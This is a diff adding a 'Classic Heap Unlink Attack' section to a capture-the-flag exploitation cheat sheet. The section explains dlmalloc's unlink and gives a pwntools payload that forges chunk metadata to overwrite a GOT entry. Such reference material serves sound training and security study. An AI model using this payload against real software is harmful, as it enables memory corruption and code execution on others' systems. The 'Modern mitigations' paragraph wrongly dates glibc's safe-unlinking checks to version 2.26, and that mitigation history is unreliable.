@@ -35,6 +35,7 @@
 - [Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)](#stack-variable-overlap--carry-corruption-oob-srdnlenctf-2026)
 - [1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)](#1-byte-overflow-via-8-bit-loop-counter-srdnlenctf-2026)
 - [Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)](#bytecode-validator-bypass-via-self-modification-srdnlenctf-2026)
+- [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
 - [Kernel Exploitation](#kernel-exploitation)
 
 ---
@@ -892,6 +893,52 @@ fake_wide_vtable = flat({
 **Key insight:** Mark-compact GC that follows null references creates controllable corruption. The cascade effect — where one corrupted header causes memmove to misalign subsequent objects — amplifies a small initial corruption into full OOB access. Combined with FSOP, this achieves code execution from a VM-level bug.
 
 **STORE array pattern for VM stack management:** When VM only has DUP/SWAP/DROP/DUP_X1, allocate an array object to hold references (via SET_ELEM_OBJ/GET_ELEM_OBJ), enabling random access to values that would otherwise require complex stack juggling.
+
+---
+
+## Classic Heap Unlink Attack (Crypto-Cat)
+
+**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.
+
+**How dlmalloc unlink works:**
+```c
+// When free() consolidates with an adjacent free chunk:
+// FD = P->fd, BK = P->bk
+// FD->bk = BK    (write BK to FD + offset)
+// BK->fd = FD    (write FD to BK + offset)
+// This is a write-what-where primitive
+```
+
+**Exploit pattern:**
+1. Allocate two adjacent chunks (A and B)
+2. Overflow A's data into B's chunk header:
+   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
+   - Clear B's `PREV_INUSE` bit in `size` field
+   - Craft fake `fd` and `bk` pointers in A's data area
+3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk
+
+```python
+from pwn import *
+
+# Fake chunk in A's data region
+fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
+fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)
+
+# Overflow from A into B's header
+payload = p64(0)              # fake prev_size for A
+payload += p64(data_size)     # fake size for A (marks A as "free")
+payload += p64(fake_fd)       # fd pointer
+payload += p64(fake_bk)       # bk pointer
+payload += b'A' * (data_size - 32)  # fill A's data
+payload += p64(data_size)     # overwrite B's prev_size
+payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit
+
+# After free(B): target_addr now contains a pointer we control
+```
+
+**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.
+
+**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.
 
 ---
 
